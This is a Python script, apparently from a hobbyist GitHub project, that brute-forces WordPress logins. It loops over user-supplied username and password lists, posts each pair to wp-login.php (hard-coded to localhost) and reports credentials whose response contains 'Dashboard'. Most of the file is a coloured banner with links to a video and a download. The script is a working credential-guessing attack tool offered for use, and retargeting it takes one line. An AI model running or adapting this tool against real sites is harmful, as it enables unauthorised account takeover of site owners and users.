#!usr/bin/python3

# Modules related comments are only applied in this Script.
import requests                           # Using this module to send request and getting response from local_server.
import sys                                # Using this module for writting formated text on the terminal.         
from colorama import Fore,Style           # Using this module for Formating my text means appling color,style,size.. etc
import time 
import os                              # Using this module to print execution time of main() function.

def main():
	os.system("clear")  # clear the screen.
	print(Fore.CYAN + "##########################################################//               \\\################################################################")	
	print(Fore.CYAN + "#########################################################// $ $ WeLCoMe $ $ \\\###############################################################")
	time.sleep(0.5)
	print(Fore.CYAN + '''########################################################//                   \\\##############################################################''')	
	time.sleep(0.5)
	print(Fore.CYAN + '''#######################################################//                     \\\#############################################################''')
	time.sleep(0.5)
	print(Fore.CYAN + "######################################################//                       \\\############################################################")
	time.sleep(0.5)
	print(Fore.CYAN + "\t\t\t\t\t\t    #//                         \\\#")
	time.sleep(0.5)
	print(Fore.CYAN + "\t\t\t\t\t\t   #//                           \\\#")
	time.sleep(0.5)
	print(Fore.CYAN + "\t\t\t\t\t\t  #//                             \\\#")
	time.sleep(0.5)
	print(Fore.CYAN + "\t\t\t\t\t\t #//                               \\\#")	
	time.sleep(0.5)
	print(Fore.CYAN + "\t\t\t\t\t\t#//            W_PRESS.PY           \\\#")
	time.sleep(0.5)
	print(Fore.CYAN + "\t\t\t\t\t\t#//''''''''''''''''''''''''''''''''''\\\#")
	time.sleep(0.5)
	print(Fore.CYAN +"\t\t\t\t\t\t#//________Written By: Satyajeet________\\\#")
	time.sleep(0.5)
	print(Fore.RED+'\n\n\t\t'+Fore.YELLOW+'Watch: https://youtu.be/sh2klOT3uws ||'+Fore.RED+'|| Download: https://github.com/satyajeet76626/WordPress_BrutForce.git')
	time.sleep(0.3)
	print(Fore.RED + "\n\n\t\t\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> WaRnInG..!!! : <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
	time.sleep(0.3)
	print(Fore.RED + '\n\t\t\t\t"::::::::If you are not able to RUN this script, Please! Read README file::::::::"')
	print(Fore.RED + '\n\t\t\t\t:::::::::::::::::::::::::::'+Fore.YELLOW +'"OR Run installer.py"'+Fore.RED+':::::::::::::::::::::::::::::::')





	# collecting url in a variable 'url'.
	url = 'http://localhost/wp-login.php'

	print(Fore.CYAN+"\n\nNOTE : "+Fore.WHITE+"Put your 'Users_list' and 'Password_list' File in same directory where 'w_press.py Script is.'" )

	print(Fore.YELLOW + "\n\nW_PrEsS >> ",end=' ')

	# Taking input of users_list and password_list from user. 
	userslist_file=input(Fore.GREEN + "Enter Users_list fileName: ")
	print(Fore.YELLOW + "\n\nW_PrEsS >> ",end=' ')
	passwordslist_file=input(Fore.GREEN + "Enter Password_list fileName: ")
		
	# Reading UserName and PassWord from files.  
	users=open(userslist_file,'r').readlines()
	passwords=open(passwordslist_file,'r').readlines()

	print(Fore.YELLOW+"\n\t\t\t______________Thanks For Using..!! ('Sit_back && Have Your Coffee!')________________")

	# Finding Total Number of UserNames and PassWords 
	users_len=len(users)
	pass_len=len(passwords)
	total=(users_len*pass_len)
	print(Fore.CYAN + "\n\n\rTotAl Passw0rD tO TrY: ",total)
	 
	c=0
	for user in users:
		for passwd in passwords:
			# Sending request and getting response with UserName & PassWord to the local server(apache2) on wordpress website.
			http = requests.post(url, data = {'log':user,'pwd':passwd,'wp-submit':'Log In'})
			datas = http.content
			# tryingh to match word 'Dashboard' in the content.
			if 'Dashboard' in str(datas):
				c+=1
				complete=(c*100)//total	
				# Formatting My OutPut to display my contents in a better way. 
				sys.stdout.write(Fore.YELLOW + "\n\n\r[+] FouNd UserName: " + Fore.GREEN + "'{}'".format(user))	
				sys.stdout.write(Fore.YELLOW + "\n\n\r[+] FouNd PassW0rd: " + Fore.GREEN + "'{}'".format(passwd))
				print(Fore.BLUE + "\n\nPasswords checked: ",end=" ")
				print(Fore.GREEN + "{}".format(c),)
				print(Fore.MAGENTA + "\t\t\t\t\t"+ Fore.GREEN +" {}%".format(complete),end=' ')
				print(Fore.MAGENTA+"CompLeTed.....\n\n")	
				# Quiting or Breaking the loop.	
				quit()			
			else:
				c+=1
				complete=(c*100)//total
				sys.stdout.write(Fore.RED + "\r\t\t\t\t\t\t[-] tRyInG....."+Fore.GREEN + "\t{}%".format(complete))
				sys.stdout.flush()

	print(Fore.CYAN+"\n\n\t\t\t\t\t\tSoRRy!!, PaSSwOrD NoT FoUnD.!\n")
	quit()

	# Resetting the Formated text color and styles.
	# print(Style.RESSET)

# Uncomment below lines to display program execution time. 

# t0=time.time()
# main()              
# t1=time.time()
# print("ExecuTion Time: ",t1-t0)



if __name__=='__main__':main()
